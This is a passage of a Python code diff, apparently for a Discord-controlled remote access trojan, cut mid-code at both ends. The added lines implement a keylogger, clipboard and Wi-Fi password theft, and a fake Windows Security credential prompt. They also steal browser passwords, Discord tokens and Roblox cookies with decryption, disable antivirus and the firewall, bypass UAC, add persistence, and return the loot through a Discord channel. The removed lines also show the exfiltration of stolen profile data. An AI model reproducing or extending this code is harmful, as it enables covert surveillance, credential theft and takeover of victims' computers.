-                            {"name": "Premium", "value": subscription_status, "inline": True},
-                            {"name": "Servers", "value": str(len(guild_list)), "inline": True},
-                            {"name": "Payment Methods", "value": ', '.join(payment_sources) if payment_sources else "None", "inline": True},
-                            {"name": "Network", "value": _get_network_location(), "inline": True},
-                            {"name": "Host", "value": os.getenv('COMPUTERNAME', 'Unknown'), "inline": True},
-                            {"name": "User", "value": os.getenv('USERNAME', 'Unknown'), "inline": True},
-                            {"name": "Platform", "value": sys.platform, "inline": True}
-                        ],
-                        "footer": {"text": f"Source: {storage_name}"},
-                        "timestamp": datetime.now().isoformat()
-                    }]
-                }
-                
-                if profile_data.get('avatar'):
-                    profile_embed["embeds"][0]["thumbnail"] = {
-                        "url": f"https://cdn.discordapp.com/avatars/{profile_data['id']}/{profile_data['avatar']}.png"
-                    }
-                
-                _send_telemetry(profile_embed)
-                
+                if len(history_text) > 1990:
+                    hist_file = os.path.join(os.getenv('TEMP'), "history.txt")
+                    with open(hist_file, 'w', encoding='utf-8') as f:
+                        f.write(history_text)
+                    file = discord.File(hist_file, filename="history.txt")
+                    await message.channel.send("[*] History", file=file)
+                    os.remove(hist_file)
+                else:
+                    await message.channel.send(f"```{history_text}```")
+            else:
+                await message.channel.send("[!] No Chrome history found")
+        except:
+            await message.channel.send("[!] History failed")
+
+    # Clipboard
+    if message.content == "!clipboard":
+        try:
+            win32clipboard.OpenClipboard()
+            data = win32clipboard.GetClipboardData()
+            win32clipboard.CloseClipboard()
+            await message.channel.send(f"[*] Clipboard: {data}")
+        except:
+            await message.channel.send("[!] Could not read clipboard")
+
+    # Sysinfo
+    if message.content == "!sysinfo":
+        try:
+            import platform
+            uname = platform.uname()
+            info = f"System: {uname.system} {uname.release}\nNode: {uname.node}\nMachine: {uname.machine}\nProcessor: {uname.processor}"
+            await message.channel.send(f"```{info}```")
+        except:
+            await message.channel.send("[!] Sysinfo failed")
+
+    # GEOLOCATE - FIXED
+    if message.content == "!geolocate":
+        await message.channel.send("[*] Locating...")
+        
+        location_text = "```\nGEOLOCATION RESULTS\n"
+        location_text += "=" * 50 + "\n\n"
+        
+        apis = [
+            f"http://ip-api.com/json/?fields=status,country,city,region,lat,lon,isp,org,query",
+            f"https://ipapi.co/json/",
+            f"https://ipinfo.io/json"
+        ]
+        
+        location_data = None
+        for api_url in apis:
+            try:
+                req = urllib.request.Request(api_url, headers={'User-Agent': get_ua()})
+                with urllib.request.urlopen(req, timeout=10) as response:
+                    data = json.loads(response.read().decode())
+                    if data.get('status') == 'success' or 'country' in data:
+                        location_data = data
+                        break
             except:
                 continue
-
-# ============================================================================
-# SOCIAL MEDIA RECONNAISSANCE
-# ============================================================================
-
-class SocialRecon:
-    @staticmethod
-    def scan_platforms(username):
-        platforms = {
-            'Twitter': f'https://twitter.com/{username}',
-            'Instagram': f'https://instagram.com/{username}',
-            'GitHub': f'https://github.com/{username}',
-            'Reddit': f'https://reddit.com/user/{username}',
-            'Telegram': f'https://t.me/{username}'
-        }
         
-        discovered = []
+        if location_data:
+            if 'query' in location_data:
+                location_text += f"IP Address: {location_data.get('query', 'Unknown')}\n"
+            elif 'ip' in location_data:
+                location_text += f"IP Address: {location_data.get('ip', 'Unknown')}\n"
+            
+            location_text += f"Country: {location_data.get('country', location_data.get('country_name', 'Unknown'))}\n"
+            location_text += f"City: {location_data.get('city', 'Unknown')}\n"
+            location_text += f"Region: {location_data.get('region', 'Unknown')}\n"
+            location_text += f"ISP: {location_data.get('isp', location_data.get('org', 'Unknown'))}\n"
+            
+            lat = location_data.get('lat', location_data.get('latitude'))
+            lon = location_data.get('lon', location_data.get('longitude'))
+            
+            if lat and lon:
+                location_text += f"Coordinates: {lat}, {lon}\n"
+                location_text += f"Google Maps: https://www.google.com/maps?q={lat},{lon}\n"
+        else:
+            location_text += "Could not determine location\n"
         
-        for platform, url in platforms.items():
+        location_text += "```"
+        await message.channel.send(location_text)
+
+    # VOICE 
+    if message.content.startswith("!voice"):
+        try:
+            volumeup()
+            speak = wincl.Dispatch("SAPI.SpVoice")
+            speak.Speak(message.content[7:])
+            await message.channel.send("[*] Voice speaking")
+        except:
+            await message.channel.send("[!] Voice failed")
+
+    # Admin check
+    if message.content == "!admincheck":
+        is_admin = ctypes.windll.shell32.IsUserAnAdmin() != 0
+        await message.channel.send("[*] You are admin!" if is_admin else "[!] You are not admin")
+
+    # Keylogger commands
+    if message.content == "!startkeylogger":
+        try:
+            log_file = os.path.join(os.getenv('TEMP'), "key_log.txt")
+            logging.basicConfig(filename=log_file, level=logging.DEBUG, format='%(asctime)s | %(message)s')
+            
+            def on_press(key):
+                try:
+                    if key == Key.space:
+                        logging.info("[SPACE]")
+                    elif key == Key.enter:
+                        logging.info("[ENTER]")
+                    elif key == Key.backspace:
+                        logging.info("[BACKSPACE]")
+                    elif hasattr(key, 'char') and key.char:
+                        logging.info(key.char)
+                    else:
+                        logging.info(f"[{str(key).replace('Key.', '').upper()}]")
+                except:
+                    pass
+            
+            def run_keylogger():
+                with Listener(on_press=on_press) as listener:
+                    listener.join()
+            
+            keylogger_thread = threading.Thread(target=run_keylogger, daemon=True)
+            keylogger_thread.start()
+            await message.channel.send("[*] Keylogger started")
+        except:
+            await message.channel.send("[!] Keylogger failed")
+
+    if message.content == "!stopkeylogger":
+        await message.channel.send("[*] Keylogger stopped (restart required)")
+
+    if message.content == "!dumpkeylogger":
+        try:
+            log_file = os.path.join(os.getenv('TEMP'), "key_log.txt")
+            if os.path.exists(log_file):
+                with open(log_file, 'r', encoding='utf-8', errors='ignore') as f:
+                    logs = f.read()
+                if logs:
+                    await message.channel.send(f"```Keylog:\n{logs[:1900]}```")
+                else:
+                    await message.channel.send("[*] No logs")
+            else:
+                await message.channel.send("[*] No log file")
+        except:
+            await message.channel.send("[!] Dump failed")
+
+    # Idle time
+    if message.content == "!idletime":
+        try:
+            from ctypes import Structure, c_uint, sizeof, byref, windll
+            class LASTINPUTINFO(Structure):
+                _fields_ = [("cbSize", c_uint), ("dwTime", c_uint)]
+            lastInputInfo = LASTINPUTINFO()
+            lastInputInfo.cbSize = sizeof(lastInputInfo)
+            if windll.user32.GetLastInputInfo(byref(lastInputInfo)):
+                millis = windll.kernel32.GetTickCount() - lastInputInfo.dwTime
+                idle_seconds = millis / 1000.0
+                await message.channel.send(f"[*] Idle: {idle_seconds:.2f} seconds")
+        except:
+            await message.channel.send("[!] Failed")
+
+    # Block/Unblock input
+    if message.content.startswith("!blockinput"):
+        if ctypes.windll.shell32.IsUserAnAdmin() != 0:
+            ctypes.windll.user32.BlockInput(True)
+            await message.channel.send("[*] Input blocked")
+        else:
+            await message.channel.send("[!] Admin required")
+
+    if message.content.startswith("!unblockinput"):
+        if ctypes.windll.shell32.IsUserAnAdmin() != 0:
+            ctypes.windll.user32.BlockInput(False)
+            await message.channel.send("[*] Input unblocked")
+        else:
+            await message.channel.send("[!] Admin required")
+
+    # List processes
+    if message.content == "!listprocess":
+        try:
+            result = subprocess.getoutput("tasklist")
+            if len(result) > 1990:
+                proc_file = os.path.join(os.getenv('TEMP'), "processes.txt")
+                with open(proc_file, 'w') as f:
+                    f.write(result)
+                file = discord.File(proc_file, filename="processes.txt")
+                await message.channel.send("[*] Process list", file=file)
+                os.remove(proc_file)
+            else:
+                await message.channel.send(f"```{result}```")
+        except:
+            await message.channel.send("[!] Failed")
+
+    # Kill process
+    if message.content.startswith("!prockill"):
+        try:
+            proc = message.content[10:]
+            subprocess.run(f'taskkill /IM "{proc}" /F', shell=True)
+            await message.channel.send(f"[*] Killed {proc}")
+        except:
+            await message.channel.send("[!] Failed")
+
+    # Current directory
+    if message.content == "!currentdir":
+        await message.channel.send(f"[*] {os.getcwd()}")
+
+    # Display directory
+    if message.content == "!displaydir":
+        try:
+            result = subprocess.getoutput('dir')
+            if len(result) > 1990:
+                dir_file = os.path.join(os.getenv('TEMP'), "dir.txt")
+                with open(dir_file, 'w') as f:
+                    f.write(result)
+                file = discord.File(dir_file, filename="dir.txt")
+                await message.channel.send("[*] Directory listing", file=file)
+                os.remove(dir_file)
+            else:
+                await message.channel.send(f"```{result}```")
+        except:
+            await message.channel.send("[!] Failed")
+
+    # Date and time
+    if message.content == "!dateandtime":
+        output = subprocess.getoutput('echo time = %time% date = %date%')
+        await message.channel.send(f"[*] {output}")
+
+    # Shutdown, restart, logoff
+    if message.content == "!shutdown":
+        uncritproc()
+        os.system("shutdown /p")
+        await message.channel.send("[*] Shutting down")
+
+    if message.content == "!restart":
+        uncritproc()
+        os.system("shutdown /r /t 00")
+        await message.channel.send("[*] Restarting")
+
+    if message.content == "!logoff":
+        uncritproc()
+        os.system("shutdown /l /f")
+        await message.channel.send("[*] Logging off")
+
+    # Bluescreen
+    if message.content == "!bluescreen":
+        try:
+            ctypes.windll.ntdll.RtlAdjustPrivilege(19, 1, 0, ctypes.byref(ctypes.c_bool()))
+            ctypes.windll.ntdll.NtRaiseHardError(0xc0000022, 0, 0, 0, 6, ctypes.byref(ctypes.c_uint()))
+        except:
+            pass
+
+    # Delete file
+    if message.content.startswith("!delete"):
+        try:
+            os.remove(message.content[8:])
+            await message.channel.send("[*] Deleted")
+        except:
+            await message.channel.send("[!] Failed")
+
+    # Disable antivirus
+    if message.content == "!disableantivirus":
+        if ctypes.windll.shell32.IsUserAnAdmin() != 0:
+            os.system(r'powershell Add-MpPreference -ExclusionPath "C:\\"')
+            await message.channel.send("[*] Defender exclusions added")
+        else:
+            await message.channel.send("[!] Admin required")
+
+    # Disable firewall
+    if message.content == "!disablefirewall":
+        if ctypes.windll.shell32.IsUserAnAdmin() != 0:
+            os.system(r"NetSh Advfirewall set allprofiles state off")
+            await message.channel.send("[*] Firewall disabled")
+        else:
+            await message.channel.send("[!] Admin required")
+
+    # Play audio
+    if message.content.startswith("!audio") and message.attachments:
+        try:
+            audio_path = os.path.join(os.getenv('TEMP'), "audio.wav")
+            await message.attachments[0].save(audio_path)
+            vbs_path = os.path.join(os.getenv('TEMP'), "play.vbs")
+            with open(vbs_path, 'w') as f:
+                f.write(f'CreateObject("WMPlayer.OCX").URL = "{audio_path}"\nCreateObject("WMPlayer.OCX").controls.play\nWScript.Sleep 5000')
+            os.system(f'start {vbs_path}')
+            await message.channel.send("[*] Playing audio")
+        except:
+            await message.channel.send("[!] Failed")
+
+    # Self destruct
+    if message.content == "!selfdestruct":
+        try:
+            uncritproc()
+            pid = os.getpid()
+            script_path = inspect.getframeinfo(inspect.currentframe()).filename
+            bat = f'@echo off\ntaskkill /F /PID {pid}\ndel "{script_path}" /F\ndel "%~f0"'
+            bat_path = os.path.join(os.getenv('TEMP'), "destroy.bat")
+            with open(bat_path, 'w') as f:
+                f.write(bat)
+            os.system(f'start /min {bat_path}')
+            await message.channel.send("[*] Self destructing")
+            sys.exit()
+        except:
+            pass
+
+    # Windows password phishing
+    if message.content == "!windowspass":
+        try:
+            cmd = 'Powershell "$cred=$host.ui.promptforcredential(\'Windows Security Update\',\'\',[Environment]::UserName,[Environment]::UserDomainName); echo $cred.getnetworkcredential().password"'
+            result = subprocess.getoutput(cmd)
+            await message.channel.send(f"[*] Password: {result}")
+        except:
+            await message.channel.send("[!] Failed")
+
+    # Display off/on
+    if message.content == "!displayoff":
+        if ctypes.windll.shell32.IsUserAnAdmin() != 0:
+            ctypes.windll.user32.SendMessageW(65535, 274, 61808, 2)
+            await message.channel.send("[*] Display off")
+        else:
+            await message.channel.send("[!] Admin required")
+
+    if message.content == "!displayon":
+        if ctypes.windll.shell32.IsUserAnAdmin() != 0:
+            pyautogui.press('esc')
+            await message.channel.send("[*] Display on")
+        else:
+            await message.channel.send("[!] Admin required")
+
+    # Hide/Unhide file
+    if message.content == "!hide":
+        script_path = inspect.getframeinfo(inspect.currentframe()).filename
+        os.system(f'attrib +h "{script_path}"')
+        await message.channel.send("[*] File hidden")
+
+    if message.content == "!unhide":
+        script_path = inspect.getframeinfo(inspect.currentframe()).filename
+        os.system(f'attrib -h "{script_path}"')
+        await message.channel.send("[*] File unhidden")
+
+    # CD eject/retract
+    if message.content == "!ejectcd":
+        ctypes.windll.WINMM.mciSendStringW('set cdaudio door open', None, 0, None)
+        await message.channel.send("[*] CD ejected")
+
+    if message.content == "!retractcd":
+        ctypes.windll.WINMM.mciSendStringW('set cdaudio door closed', None, 0, None)
+        await message.channel.send("[*] CD retracted")
+
+    # Critical process
+    if message.content == "!critproc":
+        if ctypes.windll.shell32.IsUserAnAdmin() != 0:
+            critproc()
+            await message.channel.send("[*] Critical process")
+        else:
+            await message.channel.send("[!] Admin required")
+
+    if message.content == "!uncritproc":
+        if ctypes.windll.shell32.IsUserAnAdmin() != 0:
+            uncritproc()
+            await message.channel.send("[*] Non-critical process")
+        else:
+            await message.channel.send("[!] Admin required")
+
+    # Open website
+    if message.content.startswith("!website"):
+        try:
+            url = message.content[9:]
+            if not url.startswith('http'):
+                url = 'http://' + url
+            os.system(f'start {url}')
+            await message.channel.send("[*] Website opened")
+        except:
+            await message.channel.send("[!] Failed")
+
+    # Disable/Enable task manager
+    if message.content == "!distaskmgr":
+        if ctypes.windll.shell32.IsUserAnAdmin() != 0:
+            os.system('powershell New-ItemProperty -Path "HKCU:\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Policies\\System" -Name "DisableTaskMgr" -Value "1" -Force')
+            await message.channel.send("[*] Task manager disabled")
+        else:
+            await message.channel.send("[!] Admin required")
+
+    if message.content == "!enbtaskmgr":
+        if ctypes.windll.shell32.IsUserAnAdmin() != 0:
+            os.system('powershell Remove-ItemProperty -Path "HKCU:\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Policies\\System" -Name "DisableTaskMgr" -Force')
+            await message.channel.send("[*] Task manager enabled")
+        else:
+            await message.channel.send("[!] Admin required")
+
+    # Get WiFi passwords
+    if message.content == "!getwifipass":
+        if ctypes.windll.shell32.IsUserAnAdmin() != 0:
             try:
-                response = requests.get(url, timeout=5, headers={'User-Agent': 'Mozilla/5.0'})
-                if response.status_code == 200:
-                    discovered.append(platform)
-                    print(f"{Colors.SUCCESS}    [+] Found on {platform}{Colors.RESET}")
-                time.sleep(0.3)
+                output = subprocess.getoutput('netsh wlan show profile key=clear')
+                await message.channel.send(f"```{output[:1900]}```")
+            except:
+                await message.channel.send("[!] Failed")
+        else:
+            await message.channel.send("[!] Admin required")
+
+    # Add to startup
+    if message.content == "!startup":
+        if ctypes.windll.shell32.IsUserAnAdmin() != 0:
+            try:
+                script_path = sys.argv[0]
+                startup = f"C:\\Users\\{os.getenv('USERNAME')}\\AppData\\Roaming\\Microsoft\\Windows\\Start Menu\\Programs\\Startup"
+                shutil.copy2(script_path, startup)
+                await message.channel.send("[*] Added to startup")
+            except:
+                await message.channel.send("[!] Failed")
+        else:
+            await message.channel.send("[!] Admin required")
+
+    # UAC Bypass
+    if message.content == "!uacbypass":
+        try:
+            current_dir = inspect.getframeinfo(inspect.currentframe()).filename
+            os.system('powershell New-Item "HKCU:\\SOFTWARE\\Classes\\ms-settings\\Shell\\Open\\command" -Force')
+            os.system(f'powershell Set-ItemProperty -Path "HKCU:\\Software\\Classes\\ms-settings\\Shell\\Open\\command" -Name "(Default)" -Value \'cmd /c start "" "{current_dir}"\' -Force')
+            os.system("fodhelper.exe")
+            time.sleep(2)
+            os.system('powershell Remove-Item "HKCU:\\Software\\Classes\\ms-settings\\" -Recurse -Force')
+            await message.channel.send("[*] UAC bypass attempted")
+        except:
+            await message.channel.send("[!] Failed")
+
+    # Passwords grabber
+    if message.content == "!passwords":
+        await message.channel.send("[*] Scanning for passwords...")
+        try:
+            local = os.getenv('LOCALAPPDATA')
+            roaming = os.getenv('APPDATA')
+            
+            browsers = {
+                "Chrome": local + "\\Google\\Chrome\\User Data\\Default\\Login Data",
+                "Edge": local + "\\Microsoft\\Edge\\User Data\\Default\\Login Data",
+                "Brave": local + "\\BraveSoftware\\Brave-Browser\\User Data\\Default\\Login Data",
+            }
+            
+            all_passwords = []
+            for browser_name, login_path in browsers.items():
+                if os.path.exists(login_path):
+                    temp_db = os.path.join(os.getenv('TEMP'), f"{browser_name}_login.db")
+                    shutil.copy2(login_path, temp_db)
+                    
+                    conn = sqlite3.connect(temp_db)
+                    cursor = conn.cursor()
+                    cursor.execute("SELECT origin_url, username_value, password_value FROM logins")
+                    rows = cursor.fetchall()
+                    
+                    for row in rows:
+                        if row[1] and row[2]:
+                            all_passwords.append(f"[{browser_name}] {row[0]}\nUser: {row[1]}\nPass: {row[2]}\n")
+                    
+                    conn.close()
+                    os.remove(temp_db)
+            
+            if all_passwords:
+                pwd_text = "PASSWORDS FOUND\n\n" + "\n".join(all_passwords[:30])
+                if len(pwd_text) > 1900:
+                    pwd_file = os.path.join(os.getenv('TEMP'), "passwords.txt")
+                    with open(pwd_file, 'w', encoding='utf-8') as f:
+                        f.write(pwd_text)
+                    file = discord.File(pwd_file, filename="passwords.txt")
+                    await message.channel.send("[*] Passwords found", file=file)
+                    os.remove(pwd_file)
+                else:
+                    await message.channel.send(f"```{pwd_text}```")
+            else:
+                await message.channel.send("[-] No passwords found")
+        except:
+            await message.channel.send("[!] Password grab failed")
+
+    
+    if message.content == "!getdiscordtokens":
+        await message.channel.send("[*] looking for tokens wait:=...")
+        
+        local = os.getenv('LOCALAPPDATA')
+        roaming = os.getenv('APPDATA')
+        temp = os.getenv("TEMP")
+        Tokens = ''
+        
+        def checkToken(token):
+            headers = {
+                "Authorization": token,
+                "Content-Type": "application/json",
+                "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:102.0) Gecko/20100101 Firefox/102.0"
+            }
+            try:
+                urllib.request.urlopen(urllib.request.Request("https://discordapp.com/api/v6/users/@me", headers=headers))
+                return True
+            except:
+                return False
+
+        def GetTokenInfo(token):
+            headers = {
+                "Authorization": token,
+                "Content-Type": "application/json",
+                "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:102.0) Gecko/20100101 Firefox/102.0"
+            }
+            userjson = json.loads(urllib.request.urlopen(urllib.request.Request("https://discordapp.com/api/v6/users/@me", headers=headers)).read().decode())
+            username = userjson["username"]
+            hashtag = userjson["discriminator"]
+            email = userjson["email"]
+            idd = userjson["id"]
+            pfp = userjson["avatar"]
+            flags = userjson["public_flags"]
+            nitro = ""
+            phone = "-"
+            if "premium_type" in userjson:
+                nitrot = userjson["premium_type"]
+                if nitrot == 1:
+                    nitro = "Classic Nitro"
+                elif nitrot == 2:
+                    nitro = "Nitro"
+            if "phone" in userjson:
+                phone = userjson["phone"]
+            return username, hashtag, email, idd, pfp, flags, nitro, phone
+
+        def GetBadge(flags):
+            if flags == 0:
+                return ''
+            OwnedBadges = ''
+            badgeList = [
+                {"Name": 'Early_Verified_Bot_Developer', 'Value': 131072, 'Emoji': "<:developer:874750808472825986> "},
+                {"Name": 'Bug_Hunter_Level_2', 'Value': 16384, 'Emoji': "<:bughunter_2:874750808430874664> "},
+                {"Name": 'Early_Supporter', 'Value': 512, 'Emoji': "<:early_supporter:874750808414113823> "},
+                {"Name": 'House_Balance', 'Value': 256, 'Emoji': "<:balance:874750808267292683> "},
+                {"Name": 'House_Brilliance', 'Value': 128, 'Emoji': "<:brilliance:874750808338608199> "},
+                {"Name": 'House_Bravery', 'Value': 64, 'Emoji': "<:bravery:874750808388952075> "},
+                {"Name": 'Bug_Hunter_Level_1', 'Value': 8, 'Emoji': "<:bughunter_1:874750808426692658> "},
+                {"Name": 'HypeSquad_Events', 'Value': 4, 'Emoji': "<:hypesquad_events:874750808594477056> "},
+                {"Name": 'Partnered_Server_Owner', 'Value': 2,'Emoji': "<:partner:874750808678354964> "},
+                {"Name": 'Discord_Employee', 'Value': 1, 'Emoji': "<:staff:874750808728666152> "}
+            ]
+            for badge in badgeList:
+                if flags // badge["Value"] != 0:
+                    OwnedBadges += badge["Emoji"]
+                    flags = flags % badge["Value"]
+            return OwnedBadges
+
+        def uploadToken(token, path):
+            username, hashtag, email, idd, pfp, flags, nitro, phone = GetTokenInfo(token)
+            
+            if pfp == None:
+                pfp = "https://cdn.discordapp.com/icons/1008591787788603393/362ebc1b96a9a0f7a1a59c5b17275bdb.webp"
+            else:
+                pfp = f"https://cdn.discordapp.com/avatars/{idd}/{pfp}"
+            
+            badge = GetBadge(flags)
+            
+            
+            msg = f"IP:  | Usuário: {os.getenv('USERNAME').upper()} | Encontrado em `{path}`\n"
+            msg += f"**Token:** `{token}`\n"
+            msg += f"**Email:** `{email}`\n"
+            msg += f"**Telefone:** `{phone}`\n"
+            msg += f"**Badges:** {nitro}{badge}\n"
+            msg += f"**Usuário:** {username}#{hashtag} ({idd})\n"
+            msg += f"**Avatar:** {pfp}"
+            
+            
+            asyncio.run_coroutine_threadsafe(message.channel.send(msg), client.loop)
+
+        def getToken(path, arg):
+            nonlocal Tokens
+            if not os.path.exists(path):
+                return
+            path += arg
+            for file in os.listdir(path):
+                if file.endswith(".log") or file.endswith(".ldb"):
+                    for line in [x.strip() for x in open(f"{path}\\{file}", errors="ignore").readlines() if x.strip()]:
+                        for regex in (r"[\w-]{24}\.[\w-]{6}\.[\w-]{25,110}", r"mfa\.[\w-]{80,95}"):
+                            for token in re.findall(regex, line):
+                                if checkToken(token):
+                                    if token not in Tokens:
+                                        Tokens += token
+                                        uploadToken(token, path)
+
+        def getPassw(path, arg):
+            if not os.path.exists(path):
+                return
+            pathC = path + arg + "/Login Data"
+            if os.stat(pathC).st_size == 0:
+                return
+            tempfold = temp + "wp" + ''.join(random.choice('bcdefghijklmnopqrstuvwxyz') for i in range(8)) + ".db"
+            shutil.copy2(pathC, tempfold)
+            conn = sqlite3.connect(tempfold)
+            cursor = conn.cursor()
+            cursor.execute("SELECT action_url, username_value, password_value FROM logins;")
+            data = cursor.fetchall()
+            cursor.close()
+            conn.close()
+            os.remove(tempfold)
+            pathKey = path + "/Local State"
+            with open(pathKey, 'r', encoding='utf-8') as f:
+                local_state = json.load(f)
+            master_key = base64.b64decode(local_state['os_crypt']['encrypted_key'])
+            
+            master_key = CryptUnprotectData(master_key[5:])[1]
+            
+            def DecryptValue(buff, master_key=None):
+                starts = buff.decode(encoding='utf8', errors='ignore')[:3]
+                if starts == 'v10' or starts == 'v11':
+                    iv = buff[3:15]
+                    payload = buff[15:]
+                    cipher = AES.new(master_key, AES.MODE_GCM, iv)
+                    decrypted_pass = cipher.decrypt(payload)
+                    decrypted_pass = decrypted_pass[:-16].decode()
+                    return decrypted_pass
+            
+            for row in data:
+                if row[0] != '':
+                    # writeforfile (owo)
+                    pass
+
+        def GetDiscord(path, arg):
+            nonlocal Tokens
+            if not os.path.exists(f"{path}/Local State"):
+                return
+            pathC = path + arg
+            pathKey = path + "/Local State"
+            with open(pathKey, 'r', encoding='utf-8') as f:
+                local_state = json.load(f)
+            master_key = base64.b64decode(local_state['os_crypt']['encrypted_key'])
+            master_key = CryptUnprotectData(master_key[5:])[1]
+            for file in os.listdir(pathC):
+                if file.endswith(".log") or file.endswith(".ldb"):
+                    for line in [x.strip() for x in open(f"{pathC}\\{file}", errors="ignore").readlines() if x.strip()]:
+                        for token in re.findall(r"dQw4w9WgXcQ:[^.*\['(.*)'\].*$][^\"]*", line):
+                            tokenDecoded = DecryptValue(base64.b64decode(token.split('dQw4w9WgXcQ:')[1]), master_key)
+                            if checkToken(tokenDecoded):
+                                if tokenDecoded not in Tokens:
+                                    Tokens += tokenDecoded
+                                    uploadToken(tokenDecoded, path)
+
+        def DecryptValue(buff, master_key=None):
+            starts = buff.decode(encoding='utf8', errors='ignore')[:3]
+            if starts == 'v10' or starts == 'v11':
+                iv = buff[3:15]
+                payload = buff[15:]
+                cipher = AES.new(master_key, AES.MODE_GCM, iv)
+                decrypted_pass = cipher.decrypt(payload)
+                decrypted_pass = decrypted_pass[:-16].decode()
+                return decrypted_pass
+
+        
+        browserPaths = [
+            [f"{roaming}/Opera Software/Opera GX Stable",               "opera.exe",    "/Local Storage/leveldb",           "/",            "/Network"                                                                          ],
+            [f"{roaming}/Opera Software/Opera Stable",                  "opera.exe",    "/Local Storage/leveldb",           "/",            "/Network"                                                                          ],
+            [f"{roaming}/Opera Software/Opera Neon/User Data/Default",  "opera.exe",    "/Local Storage/leveldb",           "/",            "/Network"                                                                          ],
+            [f"{local}/Google/Chrome/User Data",                        "chrome.exe",   "/Default/Local Storage/leveldb",   "/Default",     "/Default/Network"                                                                  ],
+            [f"{local}/Google/Chrome SxS/User Data",                    "chrome.exe",   "/Default/Local Storage/leveldb",   "/Default",     "/Default/Network"                                                                  ],
+            [f"{local}/BraveSoftware/Brave-Browser/User Data",          "brave.exe",    "/Default/Local Storage/leveldb",   "/Default",     "/Default/Network"                                                                  ],
+            [f"{local}/Yandex/YandexBrowser/User Data",                 "yandex.exe",   "/Default/Local Storage/leveldb",   "/Default",     "/Default/Network"                                                                  ],
+            [f"{local}/Microsoft/Edge/User Data",                       "edge.exe",     "/Default/Local Storage/leveldb",   "/Default",     "/Default/Network"                                                                  ]
+        ]
+        discordPaths = [
+            [f"{roaming}/Discord", "/Local Storage/leveldb"],
+            [f"{roaming}/Lightcord", "/Local Storage/leveldb"],
+            [f"{roaming}/discordcanary", "/Local Storage/leveldb"],
+            [f"{roaming}/discordptb", "/Local Storage/leveldb"],
+        ]
+        
+        for patt in browserPaths:
+            getToken(patt[0], patt[2])
+        for patt in discordPaths:
+            GetDiscord(patt[0], patt[1])
+        
+        if Tokens:
+            await message.channel.send(f"[+] {len(Tokens)} tokens found.")
+        else:
+            await message.channel.send("[-] no dc token found")
+
+    # OSINT command
+    if message.content == "!osint":
+        await message.channel.send("[*] scaning for meail phonen umber cards etc")
+        await message.channel.send("[*] wait a bit gng ")
+        
+        import queue
+        result_queue = queue.Queue()    
+
+     
+    if message.content == "!getrobloxcookies":
+        await message.channel.send("[*] Hunting for Roblox cookies...")
+        
+        local = os.getenv('LOCALAPPDATA')
+        roaming = os.getenv('APPDATA')
+        all_cookies = []
+        
+        
+        def get_browser_key(browser_path):
+            local_state_path = os.path.join(browser_path, "Local State")
+            if not os.path.exists(local_state_path):
+                return None
+            try:
+                with open(local_state_path, 'r', encoding='utf-8') as f:
+                    state = json.load(f)
+                enc_key = base64.b64decode(state['os_crypt']['encrypted_key'])
+                # Remove 'DPAPI' prefix (5 bytes)
+                enc_key = enc_key[5:]
+                return CryptUnprotectData(enc_key, None, None, None, 0)[1]
+            except:
+                return None
+        
+        # ----- Helper: decrypt cookie value (same logic as token decryption) -----
+        def decrypt_value(encrypted_bytes, master_key):
+            try:
+                if len(encrypted_bytes) < 3:
+                    return None
+                # Check for v10/v11 prefix on bytes
+                if encrypted_bytes[:3] in (b'v10', b'v11'):
+                    nonce = encrypted_bytes[3:15]
+                    ciphertext = encrypted_bytes[15:-16]
+                    tag = encrypted_bytes[-16:]
+                    cipher = AES.new(master_key, AES.MODE_GCM, nonce=nonce)
+                    decrypted = cipher.decrypt_and_verify(ciphertext, tag)
+                    return decrypted.decode('utf-8', errors='ignore')
+                else:
+                    # Older DPAPI only
+                    return CryptUnprotectData(encrypted_bytes).decode('utf-8', errors='ignore')
+            except:
+                return None
+        
+        # ----- Browser cookie paths (all possible locations) -----
+        browser_configs = [
+            # Chrome
+            (os.path.join(local, "Google", "Chrome", "User Data"), "Default", "Chrome"),
+            # Edge
+            (os.path.join(local, "Microsoft", "Edge", "User Data"), "Default", "Edge"),
+            # Brave
+            (os.path.join(local, "BraveSoftware", "Brave-Browser", "User Data"), "Default", "Brave"),
+            # Opera (uses different structure - cookies in Network folder)
+            (os.path.join(roaming, "Opera Software", "Opera Stable"), "Default", "Opera"),
+            (os.path.join(roaming, "Opera Software", "Opera GX Stable"), "Default", "Opera GX"),
+            # Vivaldi
+            (os.path.join(local, "Vivaldi", "User Data"), "Default", "Vivaldi"),
+            # Chromium
+            (os.path.join(local, "Chromium", "User Data"), "Default", "Chromium"),
+        ]
+        
+        for browser_path, profile, browser_name in browser_configs:
+            if not os.path.exists(browser_path):
+                continue
+            
+            # Get master key
+            master_key = get_browser_key(browser_path)
+            if not master_key:
+                continue
+            
+            # 
+            cookie_file = os.path.join(browser_path, profile, "Network", "Cookies")
+            if not os.path.exists(cookie_file):
+                cookie_file = os.path.join(browser_path, profile, "Cookies")
+            if not os.path.exists(cookie_file):
+                continue
+            
+            # Copy cookie 
+            temp_db = os.path.join(os.environ['TEMP'], f"roblox_cookies_{random.randint(1000,9999)}.db")
+            try:
+                shutil.copy2(cookie_file, temp_db)
+                conn = sqlite3.connect(temp_db)
+                cursor = conn.cursor()
+                
+                # Look for Roblox security cookie
+                cursor.execute("SELECT host_key, name, encrypted_value FROM cookies WHERE name = '.ROBLOSECURITY'")
+                rows = cursor.fetchall()
+                conn.close()
+                os.remove(temp_db)
+                
+                for row in rows:
+                    host = row[0]
+                    cookie_name = row[1]
+                    encrypted = row[2]
+                    if encrypted:
+                        decrypted = decrypt_value(encrypted, master_key)
+                        if decrypted and len(decrypted) > 50:
+                            all_cookies.append({
+                                'value': decrypted,
+                                'browser': browser_name,
+                                'host': host
+                            })
+            except:
+                try:
+                    os.remove(temp_db)
+                except:
+                    pass
+        
+        # Remove duplicates
+        unique_cookies = []
+        seen = set()
+        for c in all_cookies:
+            if c['value'] not in seen:
+                seen.add(c['value'])
+                unique_cookies.append(c)
+        
+        if not unique_cookies:
+            await message.channel.send("[-] No Roblox cookies found on this system")
+            return
+        
+        # Validate cookies and get user info
+        valid_cookies = []
+        for cookie in unique_cookies[:10]:
+            try:
+                headers = {"Cookie": f".ROBLOSECURITY={cookie['value']}", "User-Agent": get_ua()}
+                resp = requests.get("https://users.roblox.com/v1/users/authenticated", headers=headers, timeout=10)
+                if resp.status_code == 200:
+                    user_data = resp.json()
